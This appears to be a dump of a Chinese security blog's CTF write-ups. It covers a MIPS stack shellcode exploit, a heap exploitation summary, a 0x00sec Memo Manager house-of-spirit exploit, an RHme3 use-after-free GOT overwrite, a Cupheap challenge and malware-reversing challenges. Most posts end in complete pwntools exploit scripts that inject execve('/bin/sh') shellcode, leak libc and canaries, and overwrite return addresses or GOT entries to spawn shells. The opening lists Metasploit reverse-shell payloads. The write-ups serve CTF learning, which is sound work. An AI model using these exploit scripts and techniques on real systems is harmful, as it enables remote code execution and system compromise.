the attacker linux/mipsle/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) linux/mipsle/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) linux/mipsle/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) linux/mipsle/reboot A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes. linux/mipsle/shell/reverse_tcp Spawn a command shell (staged). Connect back to the attacker linux/mipsle/shell_bind_tcp Listen for a connection and spawn a command shell linux/mipsle/shell_reverse_tcp Connect back to attacker and spawn a command shell 我将shellcode放后面，调试可以到达shellcode，但是执行失败 1234567891011121314151617181920212223gef➤ x /20i 0x7f9a607c 0x7f9a607c: li a2,1638 0x7f9a6080: bltzal a2,0x7f9a6080 0x7f9a6084: slti a2,zero,-1 0x7f9a6088: addiu sp,sp,-32 0x7f9a608c: addiu a0,ra,4097 0x7f9a6090: addiu a0,a0,-4065 0x7f9a6094: sw a0,-24(sp) 0x7f9a6098: sw zero,-20(sp) 0x7f9a609c: addiu a1,sp,-24 0x7f9a60a0: li v0,4011 0x7f9a60a4: syscall 0x40404 0x7f9a60a8: 0x6e69622f 0x7f9a60ac: 0x68732f 0x7f9a60b0: 0x7f9a6070 0x7f9a60b4: 0x41414141 0x7f9a60b8: 0x41414141 0x7f9a60bc: 0x41414141 0x7f9a60c0: 0x41414141 0x7f9a60c4: 0x41414141 0x7f9a60c8: 0x41414141gef➤ x /s 0x7f9a60a80x7f9a60a8: \"/bin/sh\" 调试过程发现shellcode的sw指令将字符串/bin/sh改了 123456789101112131415161718192021222324───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:mips:3000 ]──── 0x7f9a6080 bltzal a2, 0x7f9a6080 0x7f9a6084 slti a2, zero, -1 0x7f9a6088 addiu sp, sp, -32 0x7f9a608c addiu a0, ra, 4097 0x7f9a6090 addiu a0, a0, -4065 0x7f9a6094 sw a0, -24(sp) → 0x7f9a6098 sw zero, -20(sp) 0x7f9a609c addiu a1, sp, -24 0x7f9a60a0 li v0, 4011 0x7f9a60a4 syscall 0x40404 0x7f9a60a8 0x7f9a60a8 0x7f9a60ac 0x68732f ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────[#0] Id 1, Name: \"add\", stopped, reason: BREAKPOINT────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x7f9a6098 → sw zero, -20(sp)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Watchpoint 2: *0x7f9a60a8Old value = 0x6e69622fNew value = 0x7f9a60a80x7f9a6098 in ?? () 但是shellcode在偏移8的位置则没有改变这个字符串，不知为啥，最终shellcode 如果放在后面的话，shellcode是会被破坏掉的 最终payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-12-29 23:02:48# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.log_level = &quot;debug&quot;REMOTE = 1if REMOTE: # p = remote(&quot;127.0.0.1&quot;, 10000) p = remote(&quot;pwn2.jarvisoj.com&quot;, 9889)else: p = process(&quot;./add&quot;)shellcode = &quot;&quot;shellcode += &quot;\\x66\\x06\\x06\\x24\\xff\\xff\\xd0\\x04\\xff\\xff\\x06\\x28\\xe0&quot;shellcode += &quot;\\xff\\xbd\\x27\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xe8\\xff&quot;shellcode += &quot;\\xa4\\xaf\\xec\\xff\\xa0\\xaf\\xe8\\xff\\xa5\\x27\\xab\\x0f\\x02&quot;shellcode += &quot;\\x24\\x0c\\x01\\x01\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00&quot;def leakStack(): p.recvuntil(&quot;Type &apos;help&apos; for help.\\n&quot;) num = 2057561479 p.sendline(str(num)) p.recvuntil(&quot;Your input was &quot;) leak = int(p.recvuntil(&quot;\\n&quot;)[:-1], 16) print &quot;input addr = &quot; + hex(leak) return leakleak = leakStack()# payload = &quot;\\x00&quot; * 112# payload += p32(leak + 116)# payload += shellcode + &quot; 2&quot;# p.sendline(payload)offset = 8payload = &quot;A&quot; * offset + shellcode payload += &quot;\\x00&quot; * (112 - len(payload))payload += p32(leak + offset)payload += &quot; 1&quot;p.sendline(payload)p.recvuntil(&quot;1 2\\n&quot;)p.sendline(&quot;exit&quot;)p.recvuntil(&quot;Exiting...&quot;)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"https://www.giantbranch.cn/tags/stack/"},{"name":"MIPS","slug":"MIPS","permalink":"https://www.giantbranch.cn/tags/MIPS/"}]},{"title":"CTF PWN 总结","slug":"CTF PWN 总结","date":"2017-12-28T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/28/CTF PWN 总结/","link":"","permalink":"https://www.giantbranch.cn/2017/12/28/CTF PWN 总结/","excerpt":"","text":"这个很久总结的了，基本很久没打比赛了，现在发出来了—— 20190903 本文分为信息泄露和漏洞利用技术，因为很多时候信息泄露都是通用，下面的这两部分会重合 信息泄露 程序本来就给你泄露就再好不过了 利用wrtite，puts，printf等泄露 利用%s这个遇到00才停止的可能可以泄露（strlen，strdup等都需要关注） 格式化字符串%x或这%p泄露 uaf的任意读取 smallbin（unsortbin）的fd或者bk泄露libc fasbin的fd可泄露heap基址 有时候题目甚至都没泄露函数（wrtite，puts，printf等），这时候就要将某个函数的got表改为输出函数的plt达到可泄露的目的（Hitcon 2014 stkof） 有时候利用strcpy复制到\\x00才结束可以利用程序本有的功能泄露，还可以进行溢出 可能还有申请了一个字符串数组，没有初始化清零，即可泄露栈地址，heap或者libc等，应该栈地址比较多 漏洞利用技术栈 dep没开的基本为执行shellcode或者覆盖返回地址为cat flag的函数 覆盖返回地址为getflag的函数 有libc的，泄露之后写/bin/sh到bss，再执行system（静态编译的使用系统调用），没libc就尝试libc database查或者DynELF泄露 有时候栈上的地址不够可以转移到bss或者堆上进行rop，这时候就需要栈翻转了，一般使用pop ebp;ret; leave;ret;这两个gadgets canary的话有条件的可以逐个字节爆破或者利用其他漏洞泄露 ret2dlreslove brop（待实践） srop（待实践） 有时可能是纸老虎，seccon 2017 babystack （go lang pwn） 格式化字符串 写got表 假如格式化传在堆上就通过将ebp覆盖为leave，ret的地址，在堆上进行rop 好像0ctf的EasiestPrint就是格式化绕过full relo 堆 uaf fastbin attack（包含house of spirit）【可用double free或堆溢出来干】 unlink off by one house_of_lore（small bin的前后的chunk伪造） unsortbin attack house_of_force（覆盖top chunk，返回几乎任意的指针） house_of_einherjar（控制pre size操纵合并后的地址） house of orange 堆重叠 利用“堆漏”洞泄露libc，canary，之后覆盖返回地址 0x00ctf 2017 Memo 总的利用方式其实就是劫持控制流方式 覆盖返回地址 覆盖got表 覆盖malloc hook或这free hook 覆盖虚表指针（简单uaf） 覆盖IO FILE 的vtable并伪造 （0x00sec 2017 babyheap） 覆盖ld的_dl_fini什么的绕过full relo，可以劫持exit函数（这个还需实践） 套路 00截断绕过长度检测 整数溢出绕过数字（长度）检测 堆套路1、任意地址写：fastbin 的uaf，unlink，普通的uaf2、泄露堆地址：fastbin的free3、泄露libc地址：非fastbin的free，如smallbin4、堆溢出：fastbin的uaf可以在当前堆块伪造同样大小的size之后就可以溢出下一个堆块的size了 重点关注 -1 因为0-1就整数溢出了 题目环境构建socat tcp-listen:port,fork exec:./程序名,reuseaddr nc -vc “./程序名” -kl ip port //好像不太行哦 (k即fork)","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"总结","slug":"总结","permalink":"https://www.giantbranch.cn/tags/总结/"}]},{"title":"0x00sec Memo Manager","slug":"0x00sec Memo Manager","date":"2017-12-26T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/26/0x00sec Memo Manager/","link":"","permalink":"https://www.giantbranch.cn/2017/12/26/0x00sec Memo Manager/","excerpt":"","text":"保护措施 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 这样看来还是写mallo hook，free hook（结果有限制写不了的） 程序就4个功能，先看简单的两个 dump只是简单的输出，没有检测，输出为00截断，可以信息泄露 12345int __fastcall dump(__int64 a1)&#123; return printf(&quot;Data: %s\\n&quot;, a1);&#125;’ del函数就是free，没有任何限制，只要绕过系统的检测就可以free 12345int __fastcall del(void *a1)&#123; free(a1); return puts(\"Done!\");&#125; alloc 我们输入data的时候可以二次输入，那么就可以堆溢出了，最后的那里相当于给了提示，不过暂时看来只能溢出top chunk 1234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall alloc(__int64 a1)&#123; char s1[8]; // [sp+10h] [bp-20h]@1 __int16 v3; // [sp+18h] [bp-18h]@1 __int64 v4; // [sp+28h] [bp-8h]@1 v4 = *MK_FP(__FS__, 40LL); *(_QWORD *)s1 = 0LL; v3 = 0; fwrite(&quot;Data: &quot;, 1uLL, 6uLL, stderr); if ( read(0, (void *)a1, 0x30uLL) &lt;= 0 ) &#123; puts(&quot;Read error!&quot;); exit(1); &#125; *(_QWORD *)(a1 + 24) = strdup((const char *)a1); if ( !*(_QWORD *)(a1 + 24) ) &#123; puts(&quot;Malloc error!&quot;); exit(1); &#125; printf(&quot;Are you done? [yes/no] &quot;, a1); if ( read(0, s1, 6uLL) &lt;= 0 ) &#123; printf(&quot;Read error!&quot;, s1); exit(1); &#125; if ( strcmp(s1, &quot;yes&quot;) ) &#123; if ( strcmp(s1, &quot;no&quot;) ) &#123; fwrite(&quot;Which part of [yes/no] did you not understand?&quot;, 1uLL, 0x2EuLL, stderr); exit(0); &#125; printf(&quot;Data: &quot;, &quot;no&quot;); if ( read(0, *(void **)(a1 + 24), 0x30uLL) &lt;= 0 ) &#123; puts(&quot;Read error!&quot;); exit(1); &#125; &#125; puts(&quot;Done!&quot;); return *MK_FP(__FS__, 40LL) ^ v4;&#125; 最后说一个可以覆盖data指针的功能，就是give up 12345678910111213141516171819 if ( v3 != 4 ) &#123;LABEL_20: fwrite(&quot;Can&apos;t you read mate?&quot;, 1uLL, 0x14uLL, stderr); exit(1); &#125; fwrite(&quot;Giving up already? [yes/no] &quot;, 1uLL, 0x1CuLL, stderr); if ( read(0, &amp;buf, 0x30uLL) &lt;= 0 ) &#123; puts(&quot;Read error!&quot;); exit(1); &#125; if ( !strcmp(&amp;buf, &quot;yes&quot;) ) break; if ( strcmp(&amp;buf, &quot;no&quot;) ) &#123; fwrite(&quot;Which part of [yes/no] did you not understand?&quot;, 1uLL, 0x2EuLL, stderr); exit(0); &#125; 那有了这个我们就可以任意读和任意free了 先泄露libc地址 1234567# info leak ———— leak readread_got = elf.got[&quot;read&quot;]create(&quot;A&quot; * 8)payload = &quot;no\\x00\\x00&quot; + &quot;A&quot; * 0x14 + p64(read_got)giveup(payload)read_addr = show()libc_base = read_addr - libc.symbols[&quot;read&quot;] 在泄露栈地址 1234567891011# info leak ———— leak stackcreate(&quot;C&quot; * 0x20)# show# 利用strdup也是00截断，可以连栈上的数据也复制到堆中了p.recvuntil(&quot;&gt; &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Data: &quot;)p.recvuntil(&quot;C&quot; * 0x20)recv = p.recvuntil(&quot;\\n\\n&quot;)[:-2]leak_stack = u64(recv.ljust(8, &quot;\\x00&quot;))print &quot;leak_stack = &quot; + hex(leak_stack) 那么再泄露canary的值 123456789canary_addr = buf_addr + 0x28 + 1payload = &quot;no\\x00\\x00&quot; + &quot;E&quot; * 0x14 + p64(canary_addr)giveup(payload)# showp.recvuntil(&quot;&gt; &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Data: &quot;)canary = u64(p.recv(7).ljust(8, &quot;\\x00&quot;))print &quot;canary = &quot; + hex(canary) 使用house of spirit技术，让buf+0x10的地址写到fastbin头指针 12345678# house of spirit# because strdup can&apos;t use 00fake_free_addr = buf_addr + 0x10fakechunk = &quot;no&quot; + &quot;\\x00&quot; * 6 + p64(0x21) fakechunk += p64(0) + p64(fake_free_addr)fakechunk += p64(0) + p64(111)giveup(fakechunk)free() 覆盖返回地址并返回 1234# overwrite return addressoverwrite = p64(0) * 3 + &quot;\\x00&quot; + p64(canary)[:-1] + p64(0) + p64(one_gadget)createAndOverWrite(overwrite)giveupyes() 完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-12-26 20:33:26# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.log_level = &quot;debug&quot;REMOTE = 1if REMOTE: p = remote(&quot;159.203.116.12&quot;, 8888) libc = ELF(&quot;./libc-2.23.so&quot;) one_gadget_off = 0x45216else: p = process(&quot;./memo&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) one_gadget_off = 0x3f306elf = ELF(&quot;./memo&quot;)def create(data): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Data: &quot;) p.send(data) p.recvuntil(&quot;Are you done? [yes/no] &quot;) p.send(&quot;yes&quot;)def createAndOverWrite(payload): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Data: &quot;) p.send(&quot;A&quot; * 8) p.recvuntil(&quot;Are you done? [yes/no] &quot;) # raw_input() p.send(&quot;no\\x00&quot;) p.recvuntil(&quot;Data: &quot;) p.send(payload)def show(): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Data: &quot;) recv = p.recvuntil(&quot;\\n&quot;)[:-1] return u64(recv.ljust(8, &quot;\\x00&quot;))def free(): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;3&quot;)def giveup(payload): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Giving up already? [yes/no] &quot;) p.send(payload)def giveupyes(): p.recvuntil(&quot;&gt; &quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Giving up already? [yes/no] &quot;) p.send(&quot;yes\\x00&quot;)def getpid(): print proc.pidof(p)[0] raw_input()# info leak ———— leak readread_got = elf.got[&quot;read&quot;]create(&quot;A&quot; * 8)payload = &quot;no\\x00\\x00&quot; + &quot;B&quot; * 0x14 + p64(read_got)giveup(payload)read_addr = show()print &quot;read_addr = &quot; + hex(read_addr)libc_base = read_addr - libc.symbols[&quot;read&quot;]print &quot;libc_base = &quot; + hex(libc_base)one_gadget = libc_base + one_gadget_offprint &quot;one_gadget = &quot; + hex(one_gadget)malloc_hook = libc_base + libc.symbols[&quot;__malloc_hook&quot;]# info leak ———— leak stackcreate(&quot;C&quot; * 0x20)# show# 利用strdup也是00截断，可以连栈上的数据也复制到堆中了p.recvuntil(&quot;&gt; &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Data: &quot;)p.recvuntil(&quot;C&quot; * 0x20)recv = p.recvuntil(&quot;\\n\\n&quot;)[:-2]leak_stack = u64(recv.ljust(8, &quot;\\x00&quot;))print &quot;leak_stack = &quot; + hex(leak_stack)buf_off = 0x110buf_addr = leak_stack - buf_offprint &quot;buf_addr = &quot; + hex(buf_addr)# # 经过调试发现这里其实可以可以leak heap，假如堆地址没有0x00的话。但是后来发现，题目输入的大小并不能绕过fastbin atack的大小检查，要输入0x60大小才行# create(&quot;D&quot; * 8)# p.recvuntil(&quot;&gt; &quot;)# p.sendline(&quot;2&quot;)# p.recvuntil(&quot;Data: &quot;)# p.recvuntil(&quot;C&quot; * 0x10)# recv = p.recvuntil(&quot;\\n&quot;)[:-1]# leak_heap = u64(recv.ljust(8, &quot;\\x00&quot;))# print &quot;leak_heap = &quot; + hex(leak_heap)# then try to write return addr # first leak canary(the high )canary_addr = buf_addr + 0x28 + 1payload = &quot;no\\x00\\x00&quot; + &quot;E&quot; * 0x14 + p64(canary_addr)giveup(payload)# showp.recvuntil(&quot;&gt; &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;Data: &quot;)canary = u64(p.recv(7).ljust(8, &quot;\\x00&quot;))print &quot;canary = &quot; + hex(canary)# house of spirit# because strdup can&apos;t use 00fake_free_addr = buf_addr + 0x10fakechunk = &quot;no&quot; + &quot;\\x00&quot; * 6 + p64(0x21) fakechunk += p64(0) + p64(fake_free_addr)fakechunk += p64(0) + p64(111)giveup(fakechunk)free()# overwrite return addressoverwrite = p64(0) * 3 + &quot;\\x00&quot; + p64(canary)[:-1] + p64(0) + p64(one_gadget)createAndOverWrite(overwrite)# getpid()# get shellgiveupyes()# giveupyes()p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"https://www.giantbranch.cn/tags/heap/"}]},{"title":"3DSCTF Malware 3道题 writeup","slug":"3DSCTF Malware 3道题 writeup","date":"2017-12-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/24/3DSCTF Malware 3道题 writeup/","link":"","permalink":"https://www.giantbranch.cn/2017/12/24/3DSCTF Malware 3道题 writeup/","excerpt":"","text":"这个ctf有个Malware的题型，其实也算是Re的子分类吧下载链接https://github.com/giantbranch/CTF_RE_PWN Ransomware这个题模拟一个勒索病毒，解密这个被加密的flag文件 在调试中我们可以看到比较代码，一次比较两个字节 继续找下去我们得到正确输入是25031979，我们输入看看，提交下面那一长串，不对 继续看看，那么输入正确的密码，应该是打开这个目录解密flag文件 我们创建目录，flag.mocoh文件放进去，输入正确的密码25031979，再打开文件，即可看到flag IRC Bot Takeover这个很坑，这个企图连接irc服务器，结果是连不上的 后来看来下strings，这个感觉就是flag相关的 看看在哪里，向上看了看，刚好是ird验证成功的代码 后来直接将eip设置成0040142B，调试的时候改下strcmp完的跳转标志位 到下面即可出flag的前面一部分 最后整个就出来了 W32.killah就是这个题，差点费了我的虚拟机，之后分析看了看，修复mbr就好了，就改了mbr的引导代码 在感染代码的后面发现 之后发现这两段是解密代码，但是解密之后还是乱码（直接将eip设置到那里运行就行） 突然我发现入口点也是解密的，那我先运行这里再将eip设置到那里 结果发现只出来了上半段 我就很纳闷，突然灵机一动，为什么前面的只有一段代码，而后面两段 于是我跟着规则在入口点也加了段代码 运行到nop，我再将eip设置为40111c再运行即可获得flag","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://www.giantbranch.cn/tags/Reverse/"},{"name":"malware","slug":"malware","permalink":"https://www.giantbranch.cn/tags/malware/"}]},{"title":"UAF实例——RHme3 CTF 的一道题","slug":"UAF实例——RHme3 CTF 的一道题","date":"2017-12-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2017/12/24/UAF实例——RHme3 CTF 的一道题/","link":"","permalink":"https://www.giantbranch.cn/2017/12/24/UAF实例——RHme3 CTF 的一道题/","excerpt":"","text":"来源：https://github.com/xerof4ks/heapwn/tree/master/rhme3 初步了解12345678910root@kali:~/learn/heapwn/rhme3# ./main.elf Welcome to your TeamManager (TM)!0.- Exit1.- Add player2.- Remove player3.- Select player4.- Edit player5.- Show player6.- Show teamYour choice: 堆的题目基本都是选择菜单，这里可以添加，删除，选择，编辑，展示球员，还可以显示队伍，功能看着很多啊 首先玩玩一下这个游戏，便于后期逆向一些数据结构 1234567Your choice: 1Found free slot: 0Enter player name: 1Enter attack points: 1Enter defense points: 1Enter speed: 1Enter precision: 1 上面就是球员这个结构有什么信息，第一个free slot就相当于球员的id，这个不用我们输入 remove就删除咯 123Your choice: 2Enter index: 0She's gone! select会输出球员的信息 12345Your choice: 3Enter index: 0Player selected! Name: 1 A/D/S/P: 1,1,1,1 edit当前的palyer，基于上面的select 12345678Your choice: 40.- Go back1.- Edit name2.- Set attack points3.- Set defense points4.- Set speed5.- Set precisionYour choice: show palyer，这个显示的是select的player 123Your choice: 5 Name: 2 A/D/S/P: 1,1,1,1 show team会将所有球员信息打印出来 12345678Your choice: 6Your team: Player 0 Name: 2 A/D/S/P: 1,1,1,1Player 1 Name: 3 A/D/S/P: 3,3,3,3 经过对add_player的逆向，可以推出palyer的结构 1234567struct palyer&#123; int attackPoint; int defensePoints; int speed; int precision; char* name;&#125; 编写add_palyer查看内存结构 12345678910111213def add_palyer(name, attack = 1, defense = 2, speed = 3, precision = 4): p.recvuntil(\"Your choice: \") p.sendline(\"1\") p.recvuntil(\"name: \") p.sendline(name) p.recvuntil(\"attack points: \") p.sendline(str(attack)) p.recvuntil(\"defense points: \") p.sendline(str(defense)) p.recvuntil(\"speed: \") p.sendline(str(speed)) p.recvuntil(\"precision: \") p.sendline(str(precision)) 查看内存如下，大小为0x20, 1234567891011gdb-peda$ x /20g 0x1675010-0x100x1675000: 0x0000000000000000 0x00000000000000210x1675010: 0x0000000200000001 0x00000004000000030x1675020: 0x0000000001675030 0x00000000000000710x1675030: 0x4141414141414141 0x41414141414141410x1675040: 0x4141414141414141 0x41414141414141410x1675050: 0x4141414141414141 0x41414141414141410x1675060: 0x4141414141414141 0x41414141414141410x1675070: 0x4141414141414141 0x41414141414141410x1675080: 0x4141414141414141 0x41414141414141410x1675090: 0x0000000000000000 0x0000000000020f71 添加两个球员 12345678910111213141516171819gdb-peda$ x /60gx 0x00000000017590100x1759010: 0x0000000200000001 0x00000004000000030x1759020: 0x0000000001759030 0x00000000000000710x1759030: 0x4141414141414141 0x41414141414141410x1759040: 0x4141414141414141 0x41414141414141410x1759050: 0x4141414141414141 0x41414141414141410x1759060: 0x4141414141414141 0x41414141414141410x1759070: 0x4141414141414141 0x41414141414141410x1759080: 0x4141414141414141 0x41414141414141410x1759090: 0x0000000000000000 0x00000000000000210x17590a0: 0x0000000200000001 0x00000004000000030x17590b0: 0x00000000017590c0 0x00000000000000710x17590c0: 0x4242424242424242 0x42424242424242420x17590d0: 0x4242424242424242 0x42424242424242420x17590e0: 0x4242424242424242 0x42424242424242420x17590f0: 0x4242424242424242 0x42424242424242420x1759100: 0x4242424242424242 0x42424242424242420x1759110: 0x4242424242424242 0x42424242424242420x1759120: 0x0000000000000000 0x0000000000020ee1 了解得差不多了，开始吧 查找漏洞看下delete，判断index不能大于10，且全局players数组不为0，而且delete后将相应的players索引置0，所以不存在double free，free的时候首先将name释放，再释放整个palyer 那看看释放后能否重用，看看show palyer，因为delete没将selected置0，导致可以重用，这可以导致信息泄露 再有edit可以导致任意地址写漏洞 那怎么占位呢（下面图说的0x17不一定，我们0x16，0x15等也能占位，差不多大小就行） 就是创建两个palyer，都free掉，再创建一个palyer即可占位，用name占第二个palyer的结构 还有我们下面写got的话有两个目标，一个atoi，一个strlen，不过atoi的话传入的参数只有四字节，只能传个sh过去了，strlen也是可以的，留给大家尝试，就不贴出来了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111# -*- coding: utf-8 -*-from pwn import *# context.log_level = 'debug' p = process(\"./main.elf\")elf = ELF(\"./main.elf\")libc = ELF(\"libc.so.6\")# print proc.pidof(p)[0]# print hex(elf.got[\"read\"]) #0x6030a0# print hex(elf.got[\"atoi\"]) #0x603110# print hex(elf.got[\"strlen\"]) #0x603040raw_input()def add_palyer(name, attack = 1, defense = 2, speed = 3, precision = 4): p.recvuntil(\"Your choice: \") p.sendline(\"1\") p.recvuntil(\"name: \") p.sendline(name) p.recvuntil(\"attack points: \") p.sendline(str(attack)) p.recvuntil(\"defense points: \") p.sendline(str(defense)) p.recvuntil(\"speed: \") p.sendline(str(speed)) p.recvuntil(\"precision: \") p.sendline(str(precision))def delete_palyer(index): p.recvuntil(\"Your choice: \") p.sendline(\"2\") p.recvuntil(\"Enter index: \") p.sendline(str(index))def select_palyer(index): p.recvuntil(\"Your choice: \") p.sendline(\"3\") p.recvuntil(\"Enter index: \") p.sendline(str(index))def show_palyer(): p.recvuntil(\"Your choice: \") p.sendline(\"5\")def edit_palyername(name): p.recvuntil(\"Your choice: \") p.sendline(\"4\") p.recvuntil(\"Your choice: \") p.sendline(\"1\") p.recvuntil(\"Enter new name: \") p.sendline(name)def pwning(target): p.recvuntil(\"Your choice: \") p.sendline(\"2\") p.recvuntil(\"Enter attack points: \") p.sendline(target)# ---------info leak---------add_palyer(\"A\"*0x40)add_palyer(\"A\"*0x40)select_palyer(1)# free delete_palyer(1)delete_palyer(0)# keep space# two malloc# b *0x00000000004018A7 # b *0x0000000000401955# yin wei malloc(len+1) in the binary# add_palyer(\"B\"*0x17)0x603070leakread = \"\\x02\\x02\\x01\\x01\"*4 + \"\\xa0\\x30\\x60\"print len(leakread)add_palyer(leakread)# use# b *0x00000000004020D2 show_palyer()p.recvuntil(\"Name: \")leak = p.recv(6).ljust(8, '\\x00')read_addr =u64(leak)print \"read_addr = \" + hex(read_addr)print \"\\ncalculating system() addr and \\\"/bin/sh\\\" addr ... ###\"system_addr = read_addr - (libc.symbols['read'] - libc.symbols['system'])print \"system_addr = \" + hex(system_addr)# binsh_addr = read_addr - (libc.symbols['read'] - next(libc.search(\"/bin/sh\")))# print \"binsh_addr = \" + hex(binsh_addr)# ---------write got---------delete_palyer(0)add_palyer(\"B\"*0x40)add_palyer(\"B\"*0x40)select_palyer(0)delete_palyer(0)delete_palyer(1)writeAtoiAddr = \"\\x02\\x02\\x01\\x01\"*4 + \"\\x10\\x31\\x60\"# writeStrlenAddr = \"\\x02\\x02\\x01\\x01\"*4 + \"\\x40\\x30\\x60\"add_palyer(writeAtoiAddr)edit_palyername(p64(system_addr))# raw_input()p.sendline(\"sh\")# raw_input()p.interactive()","categories":[],"tags":[]},{"title":"3DSCTF PWN —— Cupheap","slug":"3DSCTF PWN —— Cupheap","date":"2017-12-22T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/22/3DSCTF PWN —— Cupheap/","link":"","permalink":"https://www.giantbranch.cn/2017/12/22/3DSCTF PWN —— Cupheap/","excerpt":"","text":"先看保护，只开了NX 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 程序一开始malloc了四次 在内存中的结构如下 我们看到这里有个溢出 因为上面申请了8个byte，这里可以输入0x1000，那么我们可以通过第一个溢出覆盖603070指针为got表。下次再fgets就可以写got表了，因为最后会调用exit，覆盖exit的got就行 其实这题的目标是直接返回到这个函数就行了 要进入漏洞函数，需要contracts为0x1100，当他为这个值我们再利用就行 我这里本地新建了个hell文件做测试，内容是flag{test} 代码如下： 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-from pwn import *# context.log_level = \"debug\"elf = ELF(\"./cupheap\")visitHell = 0x4008F7while 1: p = process(\"./cupheap\") p.recvuntil(\"Give up\\n\") p.sendline(\"1\") recv = p.recvuntil(\"Choose one option\") if \"0x1100\" in recv: # not 1,2,3 is ok p.sendline(\"6\") p.recvuntil(\"Visit Mausoleum\\n\") p.sendline(\"4\") p.recvuntil(\"what is the name their superpowers?\\n\") payload = \"a\" * 40 payload += p64(elf.got[\"exit\"]) p.sendline(payload) sleep(2) p.sendline(p64(visitHell)) p.interactive() else: p.close()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"3DSCTF PWN —— Mr. Robof","slug":"3DSCTF PWN —— Mr. Robof","date":"2017-12-20T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2017/12/20/3DSCTF PWN —— Mr. Robof/","link":"","permalink":"https://www.giantbranch.cn/2017/12/20/3DSCTF PWN —— Mr. Robof/","excerpt":"","text":"竟然没任何保护 1234567# checksec ./020d04ea8f10ac07c5b83f3d0910108b [*] '/root/learn/3DSCTF/Robof/020d04ea8f10ac07c5b83f3d0910108b' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 基本上这种情形就是执行shellcode 漏洞在storeCheckedIP，只要绕过ip检查即可进入这里 12345678int __cdecl storeCheckedIP(char *src)&#123; char dest; // [sp+8h] [bp-30h]@1 strcpy(&amp;dest, src); puts(\"// TODO - Finish later...\"); return 1;&#125; 这两个检查是validateSize和validateIP 12v6 = validateSize(&amp;s);v5 = validateIP(&amp;s); size是大于1，小于0x28，这个strlen只要00截断即可，但是上面的strcpy也是00截断，这个肯定不行的，结果一看这个v2是8位unsigned整形，可以整数溢出啊 12345678_BOOL4 __cdecl validateSize(char *s)&#123; unsigned __int8 v2; // [sp+2Fh] [bp-9h]@1 _x86_get_pc_thunk_ax(); v2 = strlen(s); return v2 &gt; 1u &amp;&amp; v2 &lt;= 0x28u;&#125; 检测ip的（其中inet_pton是将“点分十进制” －&gt; “二进制整数”）但是这里遇到.就直接返回了，这个就棘手了后来发现10是ipv6的地址，汗~ 12345678910111213141516171819int __cdecl validateIP(int input)&#123; char *v1; // eax@1 char cp[41]; // [sp+7h] [bp-51h]@3 int v4; // [sp+38h] [bp-20h]@6 int i; // [sp+4Ch] [bp-Ch]@1 v1 = (char *)_x86_get_pc_thunk_ax() + 6430; for ( i = 0; i &lt;= 40; ++i ) &#123; if ( *(_BYTE *)(i + input) == '.' ) &#123; cp[i] = 0; return inet_pton(10, cp, &amp;v4); &#125; cp[i] = *(_BYTE *)(i 